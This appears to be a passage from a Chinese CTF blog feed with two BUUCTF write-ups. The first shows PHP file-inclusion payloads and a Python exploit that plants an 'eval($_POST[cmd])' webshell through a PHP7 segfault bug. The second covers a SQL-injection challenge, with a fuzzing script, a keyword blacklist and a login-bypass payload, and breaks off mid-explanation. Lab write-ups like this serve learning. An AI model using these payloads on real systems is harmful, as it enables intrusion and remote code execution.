class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./config.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206150606969.png" alt="image-20240206150606969"></p><h4 id="回显内容-2"><a href="#回显内容-2" class="headerlink" title="回显内容:"></a>回显内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKJHNlY3JldD0nJV4kJiQjZmZmZGZsYWdfaXNfbm90X2hlcmVfaGFfaGEnOwo/Pgo=<br></code></pre></td></tr></table></figure><h4 id="base64解码："><a href="#base64解码：" class="headerlink" title="base64解码："></a>base64解码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span>=<span class="hljs-string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所有的文件信息都获取了，但是依然没有flag的信息。</p><h2 id="使用dirseach重新扫描网站："><a href="#使用dirseach重新扫描网站：" class="headerlink" title="使用dirseach重新扫描网站："></a>使用dirseach重新扫描网站：</h2><p><strong>(这里使用新下载的字典dict_mode_dict.txt)</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python dirsearch.py -u http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/ -e * --timeout=3 -t 1 -x 400,403,404,500,503,429 -w ./dict_mode_dict.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206160429411.png" alt="image-20240206160429411"></p><p>扫了两次才出来，以后看来都得至少扫两次，发现一个dir.php文件</p><h2 id="使用文件包含漏洞获取dir-php文件信息"><a href="#使用文件包含漏洞获取dir-php文件信息" class="headerlink" title="使用文件包含漏洞获取dir.php文件信息:"></a>使用文件包含漏洞获取dir.php文件信息:</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./dir.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206160708008.png" alt="image-20240206160708008"></p><h3 id="回显内容-3"><a href="#回显内容-3" class="headerlink" title="回显内容:"></a>回显内容:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHANCnZhcl9kdW1wKHNjYW5kaXIoJy90bXAnKSk7DQo/Pg==<br></code></pre></td></tr></table></figure><h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密:"></a>base64解密:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="知识点介绍"><a href="#知识点介绍" class="headerlink" title="知识点介绍:"></a>知识点介绍:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">var_dump(scandir(&#x27;/tmp&#x27;));<br>var_dump(scandir(&#x27;/tmp&#x27;)) 这段代码的作用是获取指定目录（这里是 /tmp）下的文件和子目录列表，并将其打印输出。<br><br>具体解释如下：<br><br>scandir(&#x27;/tmp&#x27;) 是 PHP 的内置函数，用于获取指定目录中的所有文件和子目录。在这里，我们指定了目录为 /tmp，即临时目录。<br>scandir(&#x27;/tmp&#x27;) 返回一个数组，包含了目录下的所有文件和子目录的名字（包括 . 和 ..）。<br>var_dump() 是 PHP 的调试函数，用于打印输出变量的详细信息（包括类型和值）。在这里，我们将 scandir(&#x27;/tmp&#x27;) 的返回结果作为参数传递给 var_dump() 函数，以便查看该目录下的文件和子目录列表。<br>所以，这段代码的作用是获取 /tmp 目录下的文件和子目录列表，并将其详细信息打印输出，以便进行调试或查看目录内容。<br></code></pre></td></tr></table></figure><p>所以dir.php文件可以用来获取&#x2F;tmp目录下的文件信息</p><h2 id="利用php7-segment-fault特性（CVE-2018-14884）"><a href="#利用php7-segment-fault特性（CVE-2018-14884）" class="headerlink" title="利用php7 segment fault特性（CVE-2018-14884）"></a>利用php7 segment fault特性（CVE-2018-14884）</h2><p><img src="/images/2024-2-18/image-20240206162913121.png" alt="image-20240206162913121"></p><p>根据响应包可知，网站的php版本是7.0.33</p><h3 id="PHP临时文件包含"><a href="#PHP临时文件包含" class="headerlink" title="PHP临时文件包含"></a>PHP临时文件包含</h3><h4 id="参考-PHP-LFI-利用临时文件-Getshell-姿势-码农家园-codenong-com"><a href="#参考-PHP-LFI-利用临时文件-Getshell-姿势-码农家园-codenong-com" class="headerlink" title="参考:PHP LFI 利用临时文件 Getshell 姿势 | 码农家园 (codenong.com)"></a>参考:<a href="https://www.codenong.com/cs106498971/">PHP LFI 利用临时文件 Getshell 姿势 | 码农家园 (codenong.com)</a></h4><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍:"></a>漏洞介绍:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">php代码中使用php://filter的strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。<br></code></pre></td></tr></table></figure><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式:"></a>攻击方式:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">xxx.php是存在文件包含的php文件:<br>url/xxx.php?file=php://filter/string.strip_tags/resource=文件路径<br></code></pre></td></tr></table></figure><p><strong>这种 包含 会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在upload_tmp_dir所指定的目录下，不会被删除，这样就能达成getshell的目的。</strong></p><h4 id="根据载荷编写攻击脚本"><a href="#根据载荷编写攻击脚本" class="headerlink" title="根据载荷编写攻击脚本:"></a>根据载荷编写攻击脚本:</h4><h5 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py:"></a>exp.py:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#python version 2.7</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 上传我们的木马文件到/tmp目录下</span><br>payload = <span class="hljs-string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span><br>Pass_files = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(payload.encode())<br>    &#125;<br>url1 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span><br><span class="hljs-comment"># 我们设置了post传参请求，同时设置了文件上传参数files,这样就可以通过post请求上传我们的文件了</span><br>r = requests.post(url=url1, files=Pass_files, allow_redirects=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 获取/tmp/目录下我们上传的木马文件</span><br>url2 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/dir.php&#x27;</span><br>r = requests.get(url2)<br>data = re.search(<span class="hljs-string">r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;</span>, r.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).group(<span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>)<br><br><span class="hljs-comment"># 使用文件包含我们的木马文件，然后进行rce</span><br>url3 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/flflflflag.php?file=/tmp/&#x27;</span>+data<br>data = &#123;<br>    <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&quot;phpinfo();&quot;</span><br>&#125;<br>r = requests.post(url=url3, data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="访问-dir-php"><a href="#访问-dir-php" class="headerlink" title="访问:dir.php:"></a>访问:dir.php:</h4><p><strong>由于我运行了好几次脚本，所以要用最新生成的文件名:tmp&#x2F;php8dW0yU</strong></p><p><img src="/images/2024-2-18/image-20240206175058318.png" alt="image-20240206175058318"></p><h4 id="在flflflflag-php中包含tmp-php8dW0yU："><a href="#在flflflflag-php中包含tmp-php8dW0yU：" class="headerlink" title="在flflflflag.php中包含tmp&#x2F;php8dW0yU："></a>在flflflflag.php中包含tmp&#x2F;php8dW0yU：</h4><p><strong>等效于将该文件嵌入flflflflag.php中，即使tmp&#x2F;php8dW0yU没有后缀名，但是由于include()包含，flflflflag.php是主文件，所以也可以使tmp&#x2F;php8dW0yU文件的内容按照主文件的格式运行。</strong></p><p><img src="/images/2024-2-18/image-20240206175712022.png" alt="image-20240206175712022"></p><p>flag&#x3D;flag{62950e2d-8c41-4734-896d-985a6529576b}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[NCTF2019]SQLi</title>
    <link href="/2024/02/18/2023-08-20-%5BNCTF2019%5DSQLi/"/>
    <url>/2024/02/18/2023-08-20-%5BNCTF2019%5DSQLi/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p><a href="https://www.freesion.com/article/2367234678/">SQL正则盲注-regexp - 灰信网（软件开发博客聚合） (freesion.com)</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240205151103629.png" alt="image-20240205151103629"></p><h3 id="获取网页的sql语句："><a href="#获取网页的sql语句：" class="headerlink" title="获取网页的sql语句："></a>获取网页的sql语句：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sqlquery : select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;<br></code></pre></td></tr></table></figure><h2 id="第一件重要的事情，查看robots-txt"><a href="#第一件重要的事情，查看robots-txt" class="headerlink" title="第一件重要的事情，查看robots.txt:"></a>第一件重要的事情，查看robots.txt:</h2><p><img src="/images/2024-2-18/image-20240205225500432.png" alt="image-20240205225500432"></p><p>发现存在一个hint.txt</p><h2 id="查看hint-txt"><a href="#查看hint-txt" class="headerlink" title="查看hint.txt:"></a>查看hint.txt:</h2><p><img src="/images/2024-2-18/image-20240205225545093.png" alt="image-20240205225545093"></p><p>获得提示信息:</p><h3 id="hint-txt"><a href="#hint-txt" class="headerlink" title="hint.txt:"></a>hint.txt:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;<br><br><br>If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,<br><br>Then you will get the flag;<br></code></pre></td></tr></table></figure><p>根据提示信息，我们需要获得admin的密码，如果我们输入的admin账户密码正确，则返回flag,所以我们的目标就是要获取admin的密码，这里要注意admin也被过滤了。</p><h2 id="测试登录框"><a href="#测试登录框" class="headerlink" title="测试登录框:"></a>测试登录框:</h2><p><img src="/images/2024-2-18/image-20240205151307447.png" alt="image-20240205151307447"></p><h3 id="响应内容："><a href="#响应内容：" class="headerlink" title="响应内容："></a>响应内容：</h3><p><img src="/images/2024-2-18/image-20240205151328364.png" alt="image-20240205151328364"></p><p>存在对我们输入的关键词过滤，所以我们先要确定它过滤哪些内容</p><h2 id="使用bp抓包获取它的传参内容"><a href="#使用bp抓包获取它的传参内容" class="headerlink" title="使用bp抓包获取它的传参内容:"></a>使用bp抓包获取它的传参内容:</h2><h3 id="BP抓包"><a href="#BP抓包" class="headerlink" title="BP抓包:"></a>BP抓包:</h3><p><img src="/images/2024-2-18/image-20240205151548518.png" alt="image-20240205151548518"></p><p><img src="/images/2024-2-18/image-20240205151606864.png" alt="image-20240205151606864"></p><p>获取到是在index.php下的post传参，参数为username,passwd</p><h3 id="获取响应信息"><a href="#获取响应信息" class="headerlink" title="获取响应信息:"></a>获取响应信息:</h3><p><img src="/images/2024-2-18/image-20240205151746755.png" alt="image-20240205151746755"></p><p>响应信息为alert(‘hacker!!!’);</p><h2 id="使用脚本获取网站的过滤信息"><a href="#使用脚本获取网站的过滤信息" class="headerlink" title="使用脚本获取网站的过滤信息:"></a>使用脚本获取网站的过滤信息:</h2><h3 id="fuzz-py"><a href="#fuzz-py" class="headerlink" title="fuzz.py:"></a>fuzz.py:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list = []<br>white_list = []<br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://fe2b3a55-cad0-4bb2-86b2-06d51d5c8cd2.node5.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     # da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1/**/&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # 使用time使请求能够拥有足够的时间去响应</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # 获取过滤网站响应信息</span><br><span class="hljs-comment">#     reponse_txt = &quot;你还想执行&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(data)</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    <span class="hljs-comment"># POST传输json数据</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:da,<br>        <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;&#x27;hacker!!!&quot;</span><br>    <span class="hljs-comment"># print(r.text)</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br>    <span class="hljs-keyword">else</span>:<br>        white_list.append(d)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;黑名单数据:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(black_list))<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;白名单数据:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(white_list))<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">黑名单数据:[&#x27;mid&#x27;, &#x27;handler&#x27;, &#x27;like&#x27;, &#x27;LiKe&#x27;, &#x27;substr&#x27;, &#x27;SubStr&#x27;, &#x27;select&#x27;, &#x27;SeleCT&#x27;, &#x27;SElect&#x27;, &#x27;SELect&#x27;, &#x27;sleep&#x27;, &#x27;SLEEp&#x27;, &#x27;database&#x27;, &#x27;DATABASe&#x27;, &#x27;having&#x27;, &#x27;or&#x27;, &#x27;oroR&#x27;, &#x27;Or&#x27;, &#x27;oR&#x27;, &#x27;OR&#x27;, &#x27;-~&#x27;, &#x27;BENCHMARK&#x27;, &#x27;limit&#x27;, &#x27;limitLimIt&#x27;, &#x27;LImit&#x27;, &#x27;LimIt&#x27;, &#x27;select&#x27;, &#x27;SELECT&#x27;, &#x27;insert&#x27;, &#x27;insERT&#x27;, &#x27;INSERT&#x27;, &#x27;#&#x27;, &#x27;--+&#x27;, &#x27;INFORMATION&#x27;, &#x27;--&#x27;, &#x27;xor&#x27;, &#x27;&lt;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;.&#x27;, &#x27;=&#x27;, &#x27;ANDANd&#x27;, &#x27;And&#x27;, &#x27;and&#x27;, &#x27;aNd&#x27;, &#x27;BY&#x27;, &#x27;By&#x27;, &quot;&#x27;1&#x27;=&#x27;1&quot;, &quot;admin&#x27;&quot;, &#x27;length &#x27;, &#x27;select &#x27;, &#x27;database&#x27;, &#x27;union&#x27;, &#x27;UNIon&#x27;, &#x27;UNION&#x27;, &#x27;oorr&#x27;, &#x27;anandd&#x27;, &#x27;HAVING&#x27;, &#x27;IF&#x27;, &#x27;INTO&#x27;, &#x27;JOIN&#x27;, &#x27;sleep&#x27;, &#x27;LIKE&#x27;, &#x27;infromation_schema&#x27;, &#x27;OR&#x27;, &#x27;ORDER&#x27;, &#x27;ORD&#x27;, &#x27;SELECT&#x27;, &#x27;TABLE&#x27;, &#x27;UNION&#x27;, &#x27;USING&#x27;, &#x27;WHERE&#x27;, &#x27;AND&#x27;, &#x27;inset&#x27;, &#x27;CONCAT&#x27;, &#x27;GROUP_CONCAT&#x27;, &#x27;group_concat&#x27;, &#x27;DATABASE&#x27;, &#x27;DATABASES&#x27;, &#x27;floor&#x27;, &#x27;rand()&#x27;, &#x27;information_schema.tables&#x27;, &#x27;TABLE_SCHEMA&#x27;, &#x27;concat_ws()&#x27;, &#x27;concat&#x27;, &#x27;LIMIT&#x27;, &#x27;ORD&#x27;, &#x27;order &#x27;, &#x27;CAST()&#x27;, &#x27;by&#x27;, &#x27;ORDER&#x27;, &#x27;SELECT&#x27;, &#x27;TABLE&#x27;, &#x27;instr&#x27;, &#x27;benchmark&#x27;, &#x27;format&#x27;, &#x27;bin&#x27;, &#x27;substring&#x27;, &#x27;ord&#x27;, &#x27;VARCHAR&#x27;, &#x27;WHERE&#x27;, &#x27;  &#x27;, &#x27;,&#x27;, &#x27;users&#x27;, &#x27;mid&#x27;, &#x27;for&#x27;, &#x27;BEFORE&#x27;, &#x27;RLIKE&#x27;, &#x27;in&#x27;, &#x27;sys schemma&#x27;, &#x27;SEPARATOR&#x27;, &#x27;XOR&#x27;, &#x27;CURSOR&#x27;, &#x27;FLOOR&#x27;, &#x27;sys.schema_table_statistics_with_buffer&#x27;, &#x27;INFILE&#x27;, &#x27;=&#x27;, &#x27; &#x27;]<br><br>白名单数据:[&#x27;length&#x27;, &#x27;column&#x27;, &#x27;Length&#x27;, &#x27;+&#x27;, &#x27;delete&#x27;, &#x27;asAs&#x27;, &#x27;aS&#x27;, &#x27;As&#x27;, &#x27;AS&#x27;, &#x27;left&#x27;, &#x27;Left&#x27;, &#x27;LEft&#x27;, &#x27;Left&#x27;, &#x27;right&#x27;, &#x27;;&#x27;, &#x27;!&#x27;, &#x27;%&#x27;, &#x27;+&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, <br>&#x27;^&#x27;, &#x27;CAST&#x27;, &#x27;COLUMN&#x27;, &#x27;COlumn&#x27;, &#x27;COUNT&#x27;, &#x27;Count&#x27;, &#x27;CREATE&#x27;, &#x27;END&#x27;, &#x27;case&#x27;, &#x27;when&#x27;, &#x27;&quot;&#x27;, &#x27;+&#x27;, &#x27;REVERSE&#x27;, &#x27;&#x27;, &#x27;ascii&#x27;, &#x27;ASSIC&#x27;, &#x27;ASSic&#x27;, &#x27;left&#x27;, &#x27;right&#x27;, &#x27;&quot;&#x27;, &#x27;&amp;&#x27;, &#x27;&amp;&amp;&#x27;, &#x27;||&#x27;, &#x27;/&#x27;, &#x27;//&#x27;, &#x27;//*&#x27;, &#x27;*/*&#x27;, &#x27;/**/&#x27;, &#x27;GROUP&#x27;, &#x27;LEAVE&#x27;, &#x27;LEFT&#x27;, &#x27;LEVEL&#x27;, &#x27;NAMES&#x27;, &#x27;NEXT&#x27;, &#x27;NULL&#x27;, &#x27;OF&#x27;, &#x27;ON&#x27;, &#x27;|&#x27;, &#x27;user&#x27;, &#x27;SCHEMA&#x27;, &#x27;SET&#x27;, &#x27;THEN&#x27;, &#x27;UPDATE&#x27;, &#x27;USER&#x27;, &#x27;VALUE&#x27;, &#x27;VALUES&#x27;, &#x27;WHEN&#x27;, &#x27;ADD&#x27;, &#x27;prepare&#x27;, &#x27;set&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;drop&#x27;, &#x27;CAST&#x27;, &#x27;COLUMN&#x27;, &#x27;CREATE&#x27;, &#x27;alter&#x27;, &#x27;DELETE&#x27;, &#x27;DROP&#x27;, &#x27;%df&#x27;, &#x27;ON&#x27;, &#x27;extractvalue&#x27;, &#x27;OUTFILE&#x27;, &#x27;RENAME&#x27;, &#x27;REPLACE&#x27;, &#x27;SCHEMA&#x27;, &#x27;SET&#x27;, &#x27;updatexml&#x27;, &#x27;SHOW&#x27;, &#x27;SQL&#x27;, &#x27;THEN&#x27;, &#x27;TRUE&#x27;, &#x27;&#x27;, &#x27;UPDATE&#x27;, &#x27;VALUES&#x27;, &#x27;VERSION&#x27;, &#x27;WHEN&#x27;, &#x27;/*&#x27;, &#x27;`&#x27;, &#x27;%0a%0A&#x27;, &#x27;%0b&#x27;, &#x27;REGEXP&#x27;, &#x27;count&#x27;, &#x27;%0c&#x27;, &#x27;from&#x27;, &#x27;%0d&#x27;, &#x27;%a0&#x27;, &#x27;@&#x27;, &#x27;else%27%23%22%20&#x27;, &#x27;/**/&#x27;, &#x27;regexp&#x27;,&#x27;%&#x27;,&#x27;\&#x27;]<br></code></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">根据黑马单数据，我们发现网站过滤了select,且采用了大小写过滤，这里无法使用常用的盲注payload获取到数据库信息了，但是regexp没有被过滤，所以可以考虑采用正则注入。<br><br>常用的注释被过滤了，我们就用;%00代替：<br><br>&#x27;被过滤，那么用来闭合多余&#x27;就只能用\,转义字符进行代替<br></code></pre></td></tr></table></figure><h2 id="使用转义字符和万能密钥登录系统"><a href="#使用转义字符和万能密钥登录系统" class="headerlink" title="使用转义字符和万能密钥登录系统:"></a>使用转义字符和万能密钥登录系统:</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from beansystemuser where 1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205164932685.png" alt="image-20240205164932685"></p><h3 id="构造sql语句实现登录"><a href="#构造sql语句实现登录" class="headerlink" title="构造sql语句实现登录:"></a>构造sql语句实现登录:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from users where username=&#x27;\&#x27; and passwd=&#x27; || 1;%00&#x27;<br>=&gt;由于过滤了空格，所以要进行绕过<br>select * from users where username=&#x27;\&#x27; and passwd=&#x27;/**/||/**/1;%00&#x27;<br></code></pre></td></tr></table></figure><h4 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod:"></a>paylaod:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=\&amp;passwd=||/**/1;%00<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205165314530.png" alt="image-20240205165314530"></p><p>成功回显页面，同时获取到响应页面定位到welcome.php页面显示</p><h4 id="welcome-php"><a href="#welcome-php" class="headerlink" title="welcome.php:"></a>welcome.php:</h4><p><img src="/images/2024-2-18/image-20240205165536457.png" alt="image-20240205165536457"></p><p>还是一个登录界面，因为根据hint.txt的提示，我们的密码需要是admin账户的密码才可以，所以没返回我们想要的内容，但是我们至少收集到如果我们的参数输入使得sql语句有返回结果，就会有welcome.php的信息显示。</p><h2 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入:"></a>正则注入:</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理:"></a>原理:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">regexp:<br>REGEXP 是 MySQL 